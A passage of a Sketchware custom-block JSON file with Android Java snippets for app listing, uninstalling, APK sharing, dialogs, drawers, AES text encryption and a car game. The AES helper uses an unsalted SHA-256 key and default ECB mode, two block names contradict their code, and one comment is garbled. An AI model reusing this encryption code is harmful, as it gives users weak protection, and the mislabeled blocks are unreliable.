%m.FirebasePhoneAuth"},{"code":"","color":"#5F8ACB","name":"by me","typeName":"","palette":"106","type":"h","spec":"Blocks by Hussein Shakir @smith8h"},{"code":"Calendar c \u003d Calendar.getInstance();\nint timeOfDay \u003d c.get(Calendar.HOUR_OF_DAY);\n// created by @smith8h","color":"#5F8ACB","name":"time defining","typeName":"","palette":"106","type":" ","spec":"Get Now Time ⌚"},{"code":"if (timeOfDay \u003e\u003d 0 \u0026\u0026 timeOfDay \u003c 12) {\n// blocks created by @smith8h\n  %s\n}","color":"#0090FF","name":"inmoarning","typeName":"","palette":"106","type":"c","spec":"In Morning (0-12) 🌞"},{"code":"if (timeOfDay \u003e\u003d 12 \u0026\u0026 timeOfDay \u003c 16) {\n// blocks created by @smith8h\n  %s\n}","color":"#E99900","name":"afternoonsettings","typeName":"","palette":"106","type":"c","spec":"In Afternoon (12-16) 🌇"},{"code":"if (timeOfDay \u003e\u003d 16 \u0026\u0026 timeOfDay \u003c 20) {\n// blocks created by @smith8h\n  %s\n}","color":"#D0008D","name":"eveningsettings","typeName":"","palette":"106","type":"c","spec":"In Evening (16-20) 🌆"},{"code":"if (timeOfDay \u003e\u003d 20 \u0026\u0026 timeOfDay \u003c 24) {\n// blocks created by @smith8h\n  %s\n}","color":"#0054AD","name":"nightsettings","typeName":"","palette":"106","type":"c","spec":"In Night (20-24) 🌃"},{"code":"","color":"#5F8ACB","name":"timecusstomhead","typeName":"","palette":"106","type":"h","spec":"Time in 24 format like (4-12) or (13-24)"},{"code":"if(timeOfDay \u003e\u003d %s \u0026\u0026 timeOfDay \u003c %s){\n// blocks created by @smith8h\n    %s\n}","color":"#5F8ACB","name":"customtime","typeName":"","palette":"106","type":"c","spec":"Specific time ⌚ from %d to %d"},{"code":"String uri \u003d \"%1$s\";\nandroid.content.pm.PackageManager pm \u003d getPackageManager(); try { android.content.pm.PackageInfo pInfo \u003d pm.getPackageInfo(uri, android.content.pm.PackageManager.GET_ACTIVITIES); String version \u003d pInfo.versionName;%2$s.setText(version); } catch (android.content.pm.PackageManager.NameNotFoundException e) { }","color":"#C90300","name":"get version of app","typeName":"","palette":"109","type":" ","spec":"get version of app 👉 pkg name %s.inputOnly add to %m.textview"},{"code":"Uri packageURI \u003d Uri.parse(\"package:\".concat(\"%1$s\")); Intent uninstallIntent \u003d new Intent(Intent.ACTION_DELETE, packageURI); startActivity(uninstallIntent);\n","color":"#FF000000","name":"uninstall app with package name","typeName":"","palette":"109","type":" ","spec":"uninstall app 👉 pkg name %s.inputOnly "},{"code":"boolean isAppInstalled \u003d appInstalledOrNot(\"%1$s\"); \nif(isAppInstalled) {\nshowMessage(\"%2$s\");\n} else {showMessage(\"%3$s\");}\n}\nprivate boolean appInstalledOrNot(String uri) { android.content.pm.PackageManager pm \u003d getPackageManager(); try { pm.getPackageInfo(uri, android.content.pm.PackageManager.GET_ACTIVITIES); return true; } catch (android.content.pm.PackageManager.NameNotFoundException e) { } return false;","color":"#FF000000","name":"is app installed ?","typeName":"","palette":"109","type":" ","spec":"appInstalledOrNot %s.inputOnly if installed showMessage %s.inputOnly  else showMessage %s.inputOnly"},{"code":"Intent i \u003d getPackageManager().getLaunchIntentForPackage(\"%1$s\");\nif (i \u003d\u003d null) { return; } i.addCategory(Intent.CATEGORY_LAUNCHER);\nstartActivity(i);\n","color":"#ACC600","name":"open app specified app","typeName":"","palette":"109","type":" ","spec":"open app 👉 pkg name %s.inputOnly"},{"code":"Intent startupIntent \u003d new Intent(Intent.ACTION_MAIN); \t\tstartupIntent.addCategory(Intent.CATEGORY_LAUNCHER);  \t\tfinal android.content.pm.PackageManager pm \u003d getPackageManager(); \t\tList\u003candroid.content.pm.ResolveInfo\u003e activities \u003d pm.queryIntentActivities(startupIntent,0);   \t\tCollections.sort(activities, new Comparator\u003candroid.content.pm.ResolveInfo\u003e() {  \t\t\t\tpublic int compare(android.content.pm.ResolveInfo a, android.content.pm.ResolveInfo b) {  \t\t\t\t\tandroid.content.pm.PackageManager pm \u003d getPackageManager();  \t\t\t\t\treturn String.CASE_INSENSITIVE_ORDER.compare(  \t\t\t\t\t\ta.loadLabel(pm).toString(),  \t\t\t\t\t\tb.loadLabel(pm).toString());  \t\t\t\t}  \t\t\t});   \t\tArrayAdapter\u003candroid.content.pm.ResolveInfo\u003e adapter \u003d new ArrayAdapter\u003candroid.content.pm.ResolveInfo\u003e(  \t\t\tthis, android.R.layout.simple_list_item_1, activities) {  \t\t\tpublic View getView(int pos, View convertView, ViewGroup parent) { TextView tv \u003d new TextView(MainActivity.this);  \t\t\t\tandroid.content.pm.ResolveInfo ri \u003d getItem(pos);  \t\t\ttv.setText(ri.loadLabel(pm));  \tLinearLayout lin \u003d new LinearLayout(MainActivity.this);ImageView iv \u003d new ImageView(MainActivity.this);iv.setImageDrawable(ri.loadIcon(pm));lin.addView(iv);lin.addView(tv);tv.setGravity(Gravity.CENTER_VERTICAL);tv.setPadding(16,0,0,0);tv.setTextSize(16);tv.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT,LinearLayout.LayoutParams.MATCH_PARENT ));LinearLayout.LayoutParams p \u003d\tnew LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT,LinearLayout.LayoutParams.MATCH_PARENT);p.width \u003d 70;p.height \u003d 70;p.bottomMargin \u003d 4;p.topMargin \u003d 4;iv.setLayoutParams(p);lin.setPadding(6,6,6,6);return lin;  \t\t\t}  \t\t};  \t\t%1$s.setAdapter(adapter); \t\t \t\t%1$s.setOnItemClickListener(new AdapterView.OnItemClickListener() {  \t\t\t\t@Override \t\t\t\tpublic void onItemClick(AdapterView adapter, View v, int position, long id) \t\t\t\t{ \t\t\t\t\tandroid.content.pm.ResolveInfo resolveInfo \u003d (android.content.pm.ResolveInfo)adapter.getItemAtPosition(position);  \t\t\t\t\tandroid.content.pm.ActivityInfo activityInfo \u003d resolveInfo.activityInfo;  \t\t\t\t\tif (activityInfo \u003d\u003d null) return;  \t\t\t\t\tIntent i \u003d new Intent(Intent.ACTION_MAIN);  \t\t\t\t\ti.setClassName(activityInfo.applicationInfo.packageName, activityInfo.name);  \t\t\t\t\tstartActivity(i); \t\t\t\t}  \t\t\t \t\t});;","color":"#ACC600","name":"app list with icon to launch in specified listview","typeName":"","palette":"109","type":" ","spec":"list of app with icon to launch %m.listview"},{"code":"Intent startupIntent \u003d new Intent(Intent.ACTION_MAIN); \t\tstartupIntent.addCategory(Intent.CATEGORY_LAUNCHER);  \t\tfinal android.content.pm.PackageManager pm \u003d getPackageManager(); \t\tList\u003candroid.content.pm.ResolveInfo\u003e activities \u003d pm.queryIntentActivities(startupIntent,0);   \t\tCollections.sort(activities, new Comparator\u003candroid.content.pm.ResolveInfo\u003e() {  \t\t\t\tpublic int compare(android.content.pm.ResolveInfo a, android.content.pm.ResolveInfo b) {  \t\t\t\t\tandroid.content.pm.PackageManager pm \u003d getPackageManager();  \t\t\t\t\treturn String.CASE_INSENSITIVE_ORDER.compare(  \t\t\t\t\t\ta.loadLabel(pm).toString(),  \t\t\t\t\t\tb.loadLabel(pm).toString());  \t\t\t\t}  \t\t\t});   \t\tArrayAdapter\u003candroid.content.pm.ResolveInfo\u003e adapter \u003d new ArrayAdapter\u003candroid.content.pm.ResolveInfo\u003e(  \t\t\tthis, android.R.layout.simple_list_item_1, activities) {  \t\t\tpublic View getView(int pos, View convertView, ViewGroup parent) {  \t\t\t\tView v \u003d super.getView(pos, convertView, parent);  \t\t\t\tTextView tv \u003d (TextView)v;  \t\t\t\tandroid.content.pm.ResolveInfo ri \u003d getItem(pos);  \t\t\t\ttv.setText(ri.loadLabel(pm));  \t\t\t\treturn v;  \t\t\t}  \t\t};  \t\t%1$s.setAdapter(adapter); \t\t \t\t%1$s.setOnItemClickListener(new AdapterView.OnItemClickListener() {  \t\t\t\t@Override \t\t\t\tpublic void onItemClick(AdapterView adapter, View v, int position, long id) \t\t\t\t{ \t\t\t\t\tandroid.content.pm.ResolveInfo resolveInfo \u003d (android.content.pm.ResolveInfo)adapter.getItemAtPosition(position);  \t\t\t\t\tandroid.content.pm.ActivityInfo activityInfo \u003d resolveInfo.activityInfo;  \t\t\t\t\tif (activityInfo \u003d\u003d null) return;  Uri packageURI \u003d Uri.parse(\"package:\".concat(activityInfo.applicationInfo.packageName)); Intent uninstallIntent \u003d new Intent(Intent.ACTION_DELETE, packageURI); startActivity(uninstallIntent);  \t\t\t\t}  \t\t\t \t\t});;","color":"#ACC600","name":"app list without icon to launch","typeName":"","palette":"109","type":" ","spec":"list of app without icon to launch %m.listview"},{"code":"Intent startupIntent \u003d new Intent(Intent.ACTION_MAIN); \t\tstartupIntent.addCategory(Intent.CATEGORY_LAUNCHER);  \t\tfinal android.content.pm.PackageManager pm \u003d getPackageManager(); \t\tList\u003candroid.content.pm.ResolveInfo\u003e activities \u003d pm.queryIntentActivities(startupIntent,0);   \t\tCollections.sort(activities, new Comparator\u003candroid.content.pm.ResolveInfo\u003e() {  \t\t\t\tpublic int compare(android.content.pm.ResolveInfo a, android.content.pm.ResolveInfo b) {  \t\t\t\t\tandroid.content.pm.PackageManager pm \u003d getPackageManager();  \t\t\t\t\treturn String.CASE_INSENSITIVE_ORDER.compare(  \t\t\t\t\t\ta.loadLabel(pm).toString(),  \t\t\t\t\t\tb.loadLabel(pm).toString());  \t\t\t\t}  \t\t\t});   \t\tArrayAdapter\u003candroid.content.pm.ResolveInfo\u003e adapter \u003d new ArrayAdapter\u003candroid.content.pm.ResolveInfo\u003e(  \t\t\tthis, android.R.layout.simple_list_item_1, activities) {  \t\t\tpublic View getView(int pos, View convertView, ViewGroup parent) { TextView tv \u003d new TextView(MainActivity.this);  \t\t\t\tandroid.content.pm.ResolveInfo ri \u003d getItem(pos);  \t\t\ttv.setText(ri.loadLabel(pm));  \tLinearLayout lin \u003d new LinearLayout(MainActivity.this);ImageView iv \u003d new ImageView(MainActivity.this);iv.setImageDrawable(ri.loadIcon(pm));lin.addView(iv);lin.addView(tv);tv.setGravity(Gravity.CENTER_VERTICAL);tv.setPadding(16,0,0,0);tv.setTextSize(16);tv.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT,LinearLayout.LayoutParams.MATCH_PARENT ));LinearLayout.LayoutParams p \u003d\tnew LinearLayout.LayoutParams(LinearLayout.LayoutParams.WRAP_CONTENT,LinearLayout.LayoutParams.MATCH_PARENT);p.width \u003d 70;p.height \u003d 70;p.bottomMargin \u003d 4;p.topMargin \u003d 4;iv.setLayoutParams(p);lin.setPadding(6,6,6,6);return lin;  \t\t\t}  \t\t};  \t\t%1$s.setAdapter(adapter); \t\t \t\t%1$s.setOnItemClickListener(new AdapterView.OnItemClickListener() {  \t\t\t\t@Override \t\t\t\tpublic void onItemClick(AdapterView adapter, View v, int position, long id) \t\t\t\t{ \t\t\t\t\tandroid.content.pm.ResolveInfo resolveInfo \u003d (android.content.pm.ResolveInfo)adapter.getItemAtPosition(position);  \t\t\t\t\tandroid.content.pm.ActivityInfo activityInfo \u003d resolveInfo.activityInfo;  \t\t\t\t\tif (activityInfo \u003d\u003d null) return;  \t\t\t\t\tUri packageURI \u003d Uri.parse(\"package:\".concat(activityInfo.applicationInfo.packageName)); Intent uninstallIntent \u003d new Intent(Intent.ACTION_DELETE, packageURI); startActivity(uninstallIntent); \t\t\t\t}  \t\t\t \t\t});;","color":"#ACC600","name":"app list with icon to uninstall (need to add permissions)","typeName":"","palette":"109","type":" ","spec":"app list with icon to uninstall %m.listview"},{"code":"Intent startupIntent \u003d new Intent(Intent.ACTION_MAIN); \t\tstartupIntent.addCategory(Intent.CATEGORY_LAUNCHER);  \t\tfinal android.content.pm.PackageManager pm \u003d getPackageManager(); \t\tList\u003candroid.content.pm.ResolveInfo\u003e activities \u003d pm.queryIntentActivities(startupIntent,0);   \t\tCollections.sort(activities, new Comparator\u003candroid.content.pm.ResolveInfo\u003e() {  \t\t\t\tpublic int compare(android.content.pm.ResolveInfo a, android.content.pm.ResolveInfo b) {  \t\t\t\t\tandroid.content.pm.PackageManager pm \u003d getPackageManager();  \t\t\t\t\treturn String.CASE_INSENSITIVE_ORDER.compare(  \t\t\t\t\t\ta.loadLabel(pm).toString(),  \t\t\t\t\t\tb.loadLabel(pm).toString());  \t\t\t\t}  \t\t\t});   \t\tArrayAdapter\u003candroid.content.pm.ResolveInfo\u003e adapter \u003d new ArrayAdapter\u003candroid.content.pm.ResolveInfo\u003e(  \t\t\tthis, android.R.layout.simple_list_item_1, activities) {  \t\t\tpublic View getView(int pos, View convertView, ViewGroup parent) {  \t\t\t\tView v \u003d super.getView(pos, convertView, parent);  \t\t\t\tTextView tv \u003d (TextView)v;  \t\t\t\tandroid.content.pm.ResolveInfo ri \u003d getItem(pos);  \t\t\t\ttv.setText(ri.loadLabel(pm));  \t\t\t\treturn v;  \t\t\t}  \t\t};  \t\t%1$s.setAdapter(adapter); \t\t \t\t%1$s.setOnItemClickListener(new AdapterView.OnItemClickListener() {  \t\t\t\t@Override \t\t\t\tpublic void onItemClick(AdapterView adapter, View v, int position, long id) \t\t\t\t{ \t\t\t\t\tandroid.content.pm.ResolveInfo resolveInfo \u003d (android.content.pm.ResolveInfo)adapter.getItemAtPosition(position);  \t\t\t\t\tandroid.content.pm.ActivityInfo activityInfo \u003d resolveInfo.activityInfo;  \t\t\t\t\tif (activityInfo \u003d\u003d null) return;  \t\t\t\t\tIntent i \u003d new Intent(Intent.ACTION_MAIN);  \t\t\t\t\ti.setClassName(activityInfo.applicationInfo.packageName, activityInfo.name);  \t\t\t\t\tstartActivity(i); \t\t\t\t}  \t\t\t \t\t});;","color":"#ACC600","name":"app list without icon to uninstall (need permissions)","typeName":"","palette":"109","type":" ","spec":"app list without icon to uninstall %m.listview"},{"code":"boolean isAppInstalled \u003d appInstalledOrNot(\"%1$s\"); // Ɏ ?Ꭽ쎭掭?\r\nif(isAppInstalled) {\r\n%2$s\r\n} else { %3$s }}\r\n\r\nprivate boolean appInstalledOrNot(String uri) { android.content.pm.PackageManager pm \u003d getPackageManager(); try { pm.getPackageInfo(uri, android.content.pm.PackageManager.GET_ACTIVITIES); return true; } catch (android.content.pm.PackageManager.NameNotFoundException e) { } return false;","color":"#41DE23","typeName":"","name":"check if app installed then ","palette":"109","type":"e","spec":"check if app(PkgName) %s.inputOnly is installed then/else","spec2":"else"},{"code":"String apk \u003d \"\";\r\nString uri \u003d (\"%1$s\");\r\n\r\ntry {\r\nandroid.content.pm.PackageInfo pi \u003d getPackageManager().getPackageInfo(uri, android.content.pm.PackageManager.GET_ACTIVITIES);\r\n\r\napk \u003d pi.applicationInfo.publicSourceDir;\r\n} catch (Exception e) {\r\nshowMessage(e.toString());\r\n}\r\nIntent %3$s \u003d new Intent(Intent.ACTION_SEND);\r\n%3$s.setType(\"*/*\");\r\n%3$s.putExtra(Intent.EXTRA_STREAM, Uri.fromFile(new java.io.File(apk)));\r\n\r\nstartActivity(Intent.createChooser(%3$s, \"%2$s\"));","color":"#000000","name":"share apk by package name","typeName":"","palette":"109","type":" ","spec":"share apk (pkg name) %s.inputOnly SetMessage %s.inputOnly %m.intent"},{"code":"%s \u003d new PopupMenu(getApplicationContext(), %s);","name":"createNewPopupMenu","palette":"110","type":" ","spec":"%m.PopupMenu Create Popup Menu To %m.view"},{"code":"%s.getMenu().add(%s);","name":"createNewMenuPopupMenu","palette":"110","type":" ","spec":"%m.PopupMenu Create New Menu %s"},{"code":"%s.setOnMenuItemClickListener(new PopupMenu.OnMenuItemClickListener(){\n@Override\npublic boolean onMenuItemClick(MenuItem menuItem){\n%s\nreturn true;\n}\n});","name":"setOnMenuClickListener","palette":"110","type":"c","spec":"%m.PopupMenu setOnMenuItemClickListener"},{"code":"%s.getMenu().getItem(%s).setIcon(R.drawable.%s);","name":"setIconMenuPopupMenu","palette":"110","type":" ","spec":"%m.PopupMenu Get Menu Position %d Set Icon %m.resource_bg"},{"code":"%s.getMenu().addSubMenu(%s);","name":"createNewSubMenuPopupMenu","palette":"110","type":" ","spec":"%m.PopupMenu Create New SubMenu %s"},{"code":"menuItem.getTitle().toString()","name":"getTitleMenuItem","palette":"110","type":"s","spec":"%m.PopupMenu Get Title Menu"},{"code":"%s.show();","name":"showPopupMenu","palette":"110","type":" ","spec":"%m.PopupMenu show"},{"code":"getActionBar().setTitle(%s);","color":"#FF03A9F4","name":"ActionBar1","typeName":"","palette":"111","type":" ","spec":"Set Action Bar Title As %s"},{"code":"getActionBar().setSubtitle(%s);","color":"#FF03A9F4","name":"ActionBar2","typeName":"","palette":"111","type":" ","spec":"Action Bar Set Subtitle As %s"},{"code":"getActionBar().setIcon(R.drawable.%s);","color":"#FF03A9F4","name":"ActionBar3","typeName":"","palette":"111","type":" ","spec":"Action Bar Set Icon As %m.resource"},{"code":"getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,WindowManager.LayoutParams.FLAG_FULLSCREEN);","color":"#FF03A9F4","name":"ActionBar4","typeName":"","palette":"111","type":" ","spec":"Action Bar Set Mode As Fully Screen"},{"code":"getWindow().clearFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN);","color":"#FF03A9F4","name":"ActionBar5","typeName":"","palette":"111","type":" ","spec":"Action Bar Set Mode UnFully Screen"},{"code":"ActionBar ab \u003d getActionBar();\nab.setBackgroundDrawable(getDrawable(R.drawable.%s));","color":"#FF03A9F4","name":"ActionBar6","typeName":"","palette":"111","type":" ","spec":"set action bar icon %m.resource"},{"code":"%s.setLayoutParams(new LinearLayout.LayoutParams((int)%s, (int)%s));","color":"#FF03A9F4","name":"الارتفاع و العرض","typeName":"","palette":"111","type":" ","spec":"set %m.view width as %d and height  as %d"},{"code":"LinearLayout _nav_view \u003d (LinearLayout) findViewById(R.id._nav_view);  androidx.drawerlayout.widget.DrawerLayout .LayoutParams params \u003d (androidx.drawerlayout.widget.DrawerLayout .LayoutParams)_nav_view.getLayoutParams();  params.width \u003d (int)getDip((int)%s);  params.height \u003d androidx.drawerlayout.widget.DrawerLayout .LayoutParams.MATCH_PARENT;  _nav_view.setLayoutParams(params);\r","color":"#FF03A9F4","name":"Drawer Width","typeName":"","palette":"111","type":" ","spec":"Set Drawer Width as %d"},{"code":"%s.setCompoundDrawablesWithIntrinsicBounds(R.drawable.%s, 0, 0, 0);","color":"#FF03A9F4","name":"Edittext Icon","typeName":"","palette":"111","type":" ","spec":"Set %m.edittext icon as %m.resource"},{"code":" %s.setIcon(R.drawable.%s)","color":"#FF03A9F4","name":"Dialog Icon","typeName":"","palette":"111","type":" ","spec":"Set %m.dialog icon as %m.resource"},{"code":"_fab.setVisibility(View.VISIBLE);","color":"#FF03A9F4","name":"FAB SHOW","typeName":"","palette":"111","type":" ","spec":"Show FAB"},{"code":"_fab.setVisibility(View.GONE);","color":"#FF03A9F4","name":"FAB HIDE","typeName":"","palette":"111","type":" ","spec":"HIDE FAB"},{"code":"if (Build.VERSION.SDK_INT \u003e\u003d Build.VERSION_CODES.KITKAT) { Window w \u003d getWindow();  w.setFlags(WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS, WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS); };","color":"#FF03A9F4","name":"Bars Hide","typeName":"","palette":"111","type":" ","spec":"Make Navigation and status bar transparent"},{"code":"getWindow().getDecorView()\n  .setSystemUiVisibility(\n    View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY\n  );","color":"#FF03A9F4","name":"Hide Navigation Bar","typeName":"","palette":"111","type":" ","spec":"Hide Navigation Bar"},{"code":"","color":"#FF8E24AA","name":"Added By Jawad al kharrati","typeName":"","palette":"112","type":"h","spec":"Added By Arabic Ware Team By Jawad Al Kharrati"},{"code":"%2$s.setIcon(R.drawable.%1$s);","color":"#FF8E24AA","name":"Dialog Icon image","typeName":"","palette":"112","type":" ","spec":"add icon %m.resource to %m.dialog"},{"code":"%2$s.setView(%1$s);","color":"#FF8E24AA","name":"Dialog View","typeName":"","palette":"112","type":" ","spec":"add %m.view into %m.dialog"},{"code":"%s.setCancelable(%s);","color":"#FF8E24AA","name":"Cancelable","typeName":"","palette":"112","type":" ","spec":"set %m.dialog cancelable as %b"},{"code":"%1$s.dismiss();","color":"#FF8E24AA","name":"Dialog close","typeName":"","palette":"112","type":" ","spec":"Close %m.dialog"},{"code":"%1$s \u003d new AlertDialog.Builder(this,AlertDialog.THEME_TRADITIONAL);","color":"#FF8E24AA","name":"Dialog Theme 1","typeName":"","palette":"112","type":" ","spec":"%m.dialog set theme ( Beautiful Dark Mode )"},{"code":"%1$s \u003d new AlertDialog.Builder(this,AlertDialog.THEME_DEVICE_DEFAULT_DARK);","color":"#FF8E24AA","name":"Dialog Theme 2","typeName":"","palette":"112","type":" ","spec":"%m.dialog set theme ( Holo Dark )"},{"code":"%1$s \u003d new AlertDialog.Builder(this,AlertDialog.THEME_HOLO_LIGHT);","color":"#FF8E24AA","name":"Dialog Theme 3","typeName":"","palette":"112","type":" ","spec":"%m.dialog set theme ( Holo Light )"},{"code":"%1$s \u003d new AlertDialog.Builder(this,AlertDialog.THEME_DEVICE_DEFAULT_DARK);","color":"#FF8E24AA","name":"Dialog Theme 4","typeName":"","palette":"112","type":" ","spec":"%m.dialog set theme ( Default Dark )"},{"code":"%1$s \u003d new AlertDialog.Builder(this,AlertDialog.THEME_DEVICE_DEFAULT_LIGHT);","color":"#FF8E24AA","name":"Dialog Theme 5","typeName":"","palette":"112","type":" ","spec":"%m.dialog set theme ( Default Light )"},{"code":"","color":"#FF2196F3","name":"","typeName":"","palette":"113","type":"h","spec":"Subscribe My channel ( Sketchware Kurdish )"},{"code":"_drawer_%s.setTypeface(Typeface.createFromAsset(getAssets(),\"fonts/%s.ttf\"), 0);","color":"#FF2196F3","name":"Drawer Font","typeName":"","palette":"113","type":" ","spec":"drawer Set Typeface textview id :%s.inputOnly   name font%s.inputOnly "},{"code":"final LinearLayout _nav_view \u003d (LinearLayout) findViewById(R.id._nav_view); _nav_view.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(Color.TRANSPARENT));","color":"#FF2196F3","name":"Transparent Drawer","typeName":"","palette":"113","type":" ","spec":"Transparent Drawer"},{"code":"if (_drawer.isDrawerOpen(GravityCompat.START)) {\r\n\t%1$s\n}\r\nelse {\r\n\t%2$s\n}","color":"#FF039BE5","typeName":"","name":"when","palette":"113","type":"e","spec":"if drawer is open then","spec2":"else if it is close then"},{"code":"_drawer.openDrawer(GravityCompat.START);","color":"#FF039BE5","name":"open drawer","typeName":"","palette":"113","type":" ","spec":"open drawer"},{"code":"_drawer.closeDrawer(GravityCompat.START);","color":"#FF2196F3","name":"close drawer","typeName":"","palette":"113","type":" ","spec":"close drawer"},{"code":"LinearLayout _nav_view \u003d (LinearLayout) findViewById(R.id._nav_view);  androidx.drawerlayout.widget.DrawerLayout .LayoutParams params \u003d (androidx.drawerlayout.widget.DrawerLayout .LayoutParams)_nav_view.getLayoutParams();  params.width \u003d (int)getDip((int)%1$s);  params.height \u003d androidx.drawerlayout.widget.DrawerLayout .LayoutParams.MATCH_PARENT;  _nav_view.setLayoutParams(params);\n _nav_view.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(Color.TRANSPARENT));","color":"#FF039BE5","name":"drawer width","typeName":"","palette":"113","type":" ","spec":"set drawer width %d"},{"code":"%1$s.setText(%1$s.getText().toString().trim());","color":"#FF03A9F4","name":"LazyCrazyBusyEasy1","typeName":"","palette":"114","type":" ","spec":"Trim %m.textview"},{"code":"%1$s.setText(%1$s.getText().toString().toUpperCase());","color":"#FF03A9F4","name":"LazyCrazyBusyEasy2","typeName":"","palette":"114","type":" ","spec":"UpperCase text in %m.textview"},{"code":"%1$s.setText(%1$s.getText().toString().toLowerCase());","color":"#FF03A9F4","name":"LazyCrazyBusyEasy3","typeName":"","palette":"114","type":" ","spec":"LowerCase text in %m.textview"},{"code":"%s.setText(String.valueOf((long)(%s)));","color":"#FF03A9F4","name":"LazyCrazyBusyEasy4","typeName":"","palette":"114","type":" ","spec":"Set %m.textview as number without demical %d"},{"code":"%s.setText(String.valueOf(%s));","color":"#FF03A9F4","name":"LazyCrazyBusyEasy5","typeName":"","palette":"114","type":" ","spec":"Set %m.textview as number with demical %d"},{"code":"if ((%1$s \u003d\u003d %2$s) || (%1$s \u003e %2$s)) {\r\n\t\r%3$s\n}\r","color":"#FF03A9F4","name":"If Number","typeName":"","palette":"114","type":"c","spec":"if %d equals or more than %d"},{"code":"if ((%1$s \u003d\u003d %2$s) || (%1$s \u003e %2$s)) {\r\n\t\r%3$s\n}\r\nelse {\r\n\t\r%4$s\n}","color":"#FF03A9F4","typeName":"","name":"If Number else","palette":"114","type":"e","spec":"if %d equals or more than %d","spec2":"else"},{"code":"%1$s.setAction(Intent.ACTION_CALL);\r\n%1$s.setData(Uri.parse(\"tel:%2$s\"));\r\nstartActivity(%1$s);","color":"#FF03A9F4","name":"Call","typeName":"","palette":"114","type":" ","spec":"Use %m.intent  to Call this number %d"},{"code":"%1$s.setAction(Intent.ACTION_VIEW);\r\n%1$s.setData(Uri.parse(%2$s));\r\nstartActivity(%1$s);","color":"#FF03A9F4","name":"View","typeName":"","palette":"114","type":" ","spec":"Use %m.intent to view url %s"},{"code":"%1$s.setClass(getApplicationContext(), %2$s.class);\r\nstartActivity(%1$s);","color":"#FF03A9F4","name":"Set Screen","typeName":"","palette":"114","type":" ","spec":"Use %m.intent To open %m.activity"},{"code":"%1$s.put(\"%2$s\", \"%3$s\");","color":"#FF03A9F4","name":"number map variable","typeName":"","palette":"114","type":" ","spec":"%m.varMap set key %s.inputOnly set number %d "},{"code":"Double.parseDouble(%1$s.get(\"%2$s\").toString())","color":"#FF03A9F4","name":"get number map variable","typeName":"","palette":"114","type":"d","spec":"get %m.varMap with key %s.inputOnly "},{"code":"}\r\n \r\nprivate javax.crypto.SecretKey generateKey(String pwd) throws Exception {\n\nfinal java.security.MessageDigest digest \u003d java.security.MessageDigest.getInstance(\"SHA-256\");\n\nbyte[] b \u003d pwd.getBytes(\"UTF-8\");\n\ndigest.update(b,0,b.length);\n\nbyte[] key \u003d digest.digest();\n\njavax.crypto.spec.SecretKeySpec sec \u003d new javax.crypto.spec.SecretKeySpec(key, \"AES\");\n\nreturn sec;","color":"#FF2196F3","name":"AES LIBRARY BY AMEER EZIT","typeName":"","palette":"117","type":" ","spec":"INSTALL AES LIBRARY |put it into moreblock|"},{"code":"try {\njavax.crypto.SecretKey key \u003d generateKey(%s); \njavax.crypto.Cipher c \u003d javax.crypto.Cipher.getInstance(\"AES\"); \nc.init(javax.crypto.Cipher.ENCRYPT_MODE, key); \nbyte[] encVal \u003d c.doFinal(%s.getBytes());\n%s\n} catch (Exception ex) {\n%s\n}","color":"#FF2196F3","typeName":"","name":"TRY TO ENCRYPT","palette":"117","type":"e","spec":"Try to encrypt text with key %s the text is %s","spec2":"if there is bug then"},{"code":"android.util.Base64.encodeToString(encVal,android.util.Base64.DEFAULT)","color":"#FF2196F3","name":"get encrypt","typeName":"","palette":"117","type":"s","spec":"get encrypted text"},{"code":"try {\njavax.crypto.spec.SecretKeySpec key \u003d (javax.crypto.spec.SecretKeySpec) generateKey(%s);\n\njavax.crypto.Cipher c \u003d javax.crypto.Cipher.getInstance(\"AES\");\nc.init(javax.crypto.Cipher.DECRYPT_MODE,key); \nbyte[] decode \u003d android.util.Base64.decode(%s,android.util.Base64.DEFAULT); \nbyte[] decval \u003d c.doFinal(decode);\n%s\n} catch (Exception ex) {\n%s\n}","color":"#FF2196F3","typeName":"","name":"TRY TO DECRYPT","palette":"117","type":"e","spec":"try to decrypt with key %s with text %s","spec2":"if there is bug then"},{"code":"new String(decval)","color":"#FF2196F3","name":"get decrypted text","typeName":"","palette":"117","type":"s","spec":"get decrypted text"},{"code":"int[][] statesTIL \u003d new int[][] {\n    new int[] { android.R.attr.state_enabled}, // enabled\n    new int[] {-android.R.attr.state_enabled}, // disabled\n    new int[] {-android.R.attr.state_checked}, // unchecked\n    new int[] { android.R.attr.state_pressed}  // pressed\n};\n\nint[] colorsTIL \u003d new int[] {\n    Color.%1$S,\n    Color.RED,\n    Color.GREEN,\n    Color.BLUE\n};\n\nandroid.content.res.ColorStateList %2$s \u003d new android.content.res.ColorStateList(statesTIL, colorsTIL);","name":"ColorStateList","palette":"10","type":" ","spec":"Create Color %s.inputOnly to ColorStateList %s.inputOnly"},{"code":"GameView bcv \u003d new\nGameView(this);\n%s.addView(bcv);","color":"#FFC62828","name":"Add Car into_copy82","typeName":"","palette":"-1","type":" ","spec":"Add simple car game into %m.view"},{"code":"String.valueOf(score)).commit()","color":"#FFC62828","name":"get score","typeName":"","palette":"12","type":"s","spec":"get score"},{"code":"GameView bcv \u003d new\nGameView(this);\n%s.addView(bcv);","color":"#FFC62828","name":"Add Car into","typeName":"","palette":"12","type":" ","spec":"Add simple car game into %m.view"},{"code":"}\n\npublic class GameView extends View{\nprivate Paint myPaint;\nprivate int speed\u003d3;\nprivate int time \u003d 0;\nprivate int score \u003d 0;\nprivate int myCarPosition \u003d 0;\nprivate ArrayList\u003cHashMap\u003cString, Object\u003e\u003e otherCars \u003d new ArrayList\u003c\u003e();\n\nint viewWidth \u003d 0;\nint viewHeight \u003d 0;\n\npublic GameView(Context context){\nsuper(context);\nmyPaint \u003d new Paint();\n}\n\n@Override\nprotected void onDraw(Canvas canvas) {\nviewWidth \u003d this.getMeasuredWidth();\nviewHeight \u003d this.getMeasuredHeight();\n\nif (time \u003c 10 + speed){\nHashMap\u003cString, Object\u003e map \u003d new HashMap\u003c\u003e();\nmap.put(\"lane\", 